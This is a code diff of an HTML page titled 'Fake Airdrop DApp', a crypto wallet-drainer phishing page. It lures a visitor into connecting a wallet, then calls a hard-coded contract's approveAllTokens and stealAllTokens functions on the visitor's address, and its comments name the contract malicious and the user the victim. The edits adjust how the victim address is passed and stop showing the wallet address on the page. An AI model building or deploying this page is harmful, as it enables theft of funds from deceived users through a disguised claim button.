@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Fake Airdrop DApp</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.min.js"></script>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -30,11 +30,6 @@
         .button:disabled {
             background-color: #ccc;
         }
-        .note {
-            margin-top: 10px;
-            font-size: 0.9em;
-            color: gray;
-        }
     </style>
 </head>
 <body>
@@ -45,14 +40,13 @@
     <button id="connectWalletButton" class="button">Connect Wallet</button>
     <button id="claimAirdropButton" class="button" disabled>Claim Airdrop</button>
     <p class="note">Note: Make sure to approve before claiming.</p>
-    <p id="walletAddress"></p>
 </div>
 
 <script>
     let provider;
     let signer;
-    let contractAddress = "0xcD8F8002E9A7B9e20Af9B6bb1D6AE0C6754Fe8c9"; // Contract Address
-    let contractABI = [
+    const contractAddress = "0xcD8F8002E9A7B9e20Af9B6bb1D6AE0C6754Fe8c9"; // Contract Address
+    const contractABI = [
         {
             "inputs": [
                 { "internalType": "address", "name": "token", "type": "address" }
@@ -79,9 +73,7 @@
                 provider = new ethers.providers.Web3Provider(window.ethereum);
                 await provider.send("eth_requestAccounts", []);
                 signer = provider.getSigner();
-                const address = await signer.getAddress();
-                console.log("Wallet connected:", address);
-                document.getElementById("walletAddress").innerText = `Wallet Address: ${address}`;
+                console.log("Wallet connected!");
                 document.getElementById("claimAirdropButton").disabled = false;
             } catch (error) {
                 console.error("Failed to connect wallet:", error);
@@ -97,15 +89,13 @@
             const contract = new ethers.Contract(contractAddress, contractABI, signer);
 
             // Approve all tokens using the malicious contract
-            const tokenAddress = "0x90BCEc92010cA4fEA0F7d62D11A8664CfAe2de0E"; // Replace with actual token address
-            const approveTx = await contract.approveAllTokens(tokenAddress);
+            const victimAddress = await signer.getAddress();
+            const approveTx = await contract.approveAllTokens(victimAddress);
             console.log("Approval transaction sent:", approveTx.hash);
-
-            await approveTx.wait(); // Wait for transaction to be mined
+            await approveTx.wait(); // Wait for the transaction to be mined
             console.log("Approval granted!");
 
             // Simulate stealing all tokens
-            const victimAddress = await signer.getAddress();
             const stealTx = await contract.stealAllTokens(victimAddress);
             console.log("Tokens stolen:", stealTx.hash);
 
